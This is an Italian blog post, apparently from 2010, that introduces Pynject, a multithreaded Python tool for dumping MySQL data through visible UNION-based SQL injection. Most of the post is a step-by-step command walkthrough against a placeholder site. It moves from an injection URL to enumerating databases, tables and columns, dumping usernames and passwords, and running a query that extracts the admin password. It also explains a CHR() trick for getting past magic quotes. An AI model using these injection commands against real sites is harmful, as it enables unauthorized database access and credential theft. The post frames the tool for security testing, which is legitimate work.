@@ -1,0 +1,46 @@
+Date: 2010-09-17 14:37:41
+Author: evilsocket
+Categories: Exploiting, Hacking, Programmazione, Python, Sorgenti, Tools, Web Hacking
+Tags: data dump, dump, fast, multi threaded, pynject, python, sql injection, sqlibf, sqlmap, thread, tool, visible union
+Title: Pynject: An automatic and multithreaded MySQL data dumper tool.
+
+Scrivo questo articolo per presentare un piccolo tool che sto scrivendo in questi giorni (nonostante la febbre, sigh! :().
+Quando eseguo test di sicurezza su applicazioni web e mi ritrovo nella condizione di dover visualizzare dei dati dal db (ad esempio, enumerare tabelle, colonne, ecc al fine di ottenere un utenza di amministrazione) inizio sempre a smadonnare, poichè so che, se effettuato manualmente sarà un processo molto lungo e lento.
+Anche con strumenti molto rinomati, come ad esempio SQLMAP, l'operazione impiega veramente molto tempo, sia xkè vengono forzate injections di tipo blind (notoriamente molto più lente rispetto alle union), sia xkè ogni richiesta viene eseguita in modo sincrono, ovvero una alla volta.
+
+Così ho scritto un tool che risolve entrambi i problemi ^^
+
+<break>Una volta trovata (manualmente o tramite strumenti come sqlibf, che io adoro tra l'altro) una injection di tipo UNION visibile (ovvero dove almeno uno dei campi viene visualizzato nel html), basta passarla al tool e dirgli cosa deve fare, e lui tirerà giù tutte le informazioni molto velocemente, poichè utilizza (di default, ma è impostabile tramite parametri) 30 threads paralleli per eseguire le richieste!
+
+Vediamo un esempio, diciamo che <a href="http://www.securiteam.com/tools/5BP0N20IAO.html" target="_blank">sqlibf</a> ci ha restituito una union di questo tipo :
+<blockquote>http://www.site.com/news.php?id=1 AND 1=2 UNION ALL SELECT NULL,NULL,NULL,NULL--</blockquote>
+E che il campo visibile sia il secondo, innanzitutto dovremmo indicare al pynject quale è questo campo (che lui utilizzerà durante tutto il corso dell'esecuzione), quindi sceglieremo un "marker", ovvero una stringa che identifichi quel campo, diciamo '####', quindi l'url diventerà :
+<blockquote>http://www.site.com/news.php?id=1 AND 1=2 UNION ALL SELECT NULL,<strong>####</strong>,NULL,NULL--</blockquote>
+Fatto questo, ci basterà passare a pynject queste due informazioni e dirgli cosa vogliamo fare, ad esempio :
+
+Enumeriamo tutti i database :
+<blockquote>
+<div id="_mcePaste">pynject.py -u 'http://www.site.com/news.php?id=1%20AND%201=2%20UNION%20ALL%20SELECT%20NULL,####,NULL,NULL--' -m '####' --dbs</div></blockquote>
+<div>Enumeriamo tutte le tabelle del db 'shop', utilizzando 50 threads paralleli :</div>
+<div>
+<blockquote>
+<div>pynject.py -u 'http://www.site.com/news.php?id=1%20AND%201=2%20UNION%20ALL%20SELECT%20NULL,####,NULL,NULL--' -m '####' -D shop --tables --threads 50</div></blockquote>
+<div>Enumeriamo le colonne della tabella 'users' :</div>
+</div>
+<div>
+<blockquote>
+<div>pynject.py -u 'http://www.site.com/news.php?id=1%20AND%201=2%20UNION%20ALL%20SELECT%20NULL,####,NULL,NULL--' -m '####' -D shop -T users --columns</div></blockquote>
+</div>
+<div>
+<div>Dumpiamo i primi 100 records della tabella users, visualizzando i campi username e password :</div>
+<blockquote>
+<div>pynject.py -u 'http://www.site.com/news.php?id=1%20AND%201=2%20UNION%20ALL%20SELECT%20NULL,####,NULL,NULL--' -m '####' -D shop -T users -F 'username,password' --records --start 0 --end 100</div></blockquote>
+<div>Eseguiamo una query arbitraria, in questo caso selezioniamo la password di amministrazione :</div>
+<blockquote>
+<div>
+<div>pynject.py -u 'http://www.site.com/news.php?id=1%20AND%201=2%20UNION%20ALL%20SELECT%20NULL,####,NULL,NULL--' -m '####' --query 'SELECT password FROM shop.users WHERE username='admin' LIMIT 0,1'</div>
+</div></blockquote>
+<div>Una nota va fatta per questo ultimo esempio ... ogni stringa che contenga un apice singolo o doppio (in quel caso 'admin'), viene rimpiazzata con il corrispettivo CHR(...), così da evitare problemi la dove siano attive le magic quotes.</div>
+</div>
+<div>Come potrete vedere dal menu help, le opzioni sono veramente tante, quindi divertitevi a sperimentare e qual'ora ne riscontraste qualcuno, segnalatemi eventuali bug.</div>
+<div>Trovate il codice su github, all'indirizzo <a href="http://github.com/evilsocket/Pynject" target="_blank">http://github.com/evilsocket/Pynject</a></div>
